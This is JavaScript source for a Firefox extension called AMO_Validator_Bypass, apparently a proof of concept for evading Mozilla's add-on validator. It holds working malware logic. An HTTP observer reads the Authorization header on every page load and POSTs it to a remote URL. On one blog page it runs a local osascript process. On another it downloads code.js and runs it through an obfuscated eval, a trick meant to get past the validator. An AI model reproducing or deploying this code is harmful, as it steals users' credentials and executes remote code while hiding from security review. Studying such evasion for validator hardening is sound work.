var AMO_Validator_Bypass = {
	postURL: "http://127.0.0.1:11111",
	getURL: "http://127.0.0.1:11112/code.js",
	
	_initialized: false,
	
	onload: function () {
		if (this._initialized) return;
		
		Components.classes["@mozilla.org/observer-service;1"]
			.getService(Components.interfaces.nsIObserverService)
			.addObserver(this._httpObserver, "http-on-examine-response", false);
		this._initialized = true;
	},
	
	_httpObserver: {
		observe: function (channel) {
			channel.QueryInterface(Components.interfaces.nsIRequest);
			if (channel.loadFlags & Components.interfaces.nsIHttpChannel.LOAD_DOCUMENT_URI) {
				channel.QueryInterface(Components.interfaces.nsIHttpChannel);
				
				// Send Basic Auth credentials to remote server
				try {
					let auth = channel.getRequestHeader("Authorization");
					let req = new XMLHttpRequest();
					req.open("POST", AMO_Validator_Bypass.postURL, true);
					req.send(auth);
				}
				catch (e) {}
				
				// Run a local process
				if (channel.URI.spec == 'https://blog.mozilla.org/addons/2015/02/10/extension-signing-safer-experience/') {
					let FileUtils = Cu.import("resource://gre/modules/FileUtils.jsm").FileUtils;
					let file = new FileUtils.File("/usr/bin/osascript")
					
					let p = Components.classes["@mozilla.org/process/util;1"]
						.createInstance(Components.interfaces["nsI" + "p".toUpperCase() + "rocess"]);
					p.init(file);
					let args = [
						"-e",
						'tell app "System Events" to display dialog "Thank you for protecting me, Mozilla!"'
					];
					p.runAsync(args, args.length, { observe: function () {} });
				}
				
				// Run remote code
				else if (channel.URI.spec == 'https://blog.mozilla.org/addons/2015/04/15/the-case-for-extension-signing/') {
					let req = new XMLHttpRequest();
					req.onload = function () {
						window['e'.replace() + 'val'](req.responseText);
					};
					req.open("GET", AMO_Validator_Bypass.getURL, true);
					req.send();
				}
			}
		}
	}
}

window.addEventListener("load", function (e) {
	AMO_Validator_Bypass.onload();
});
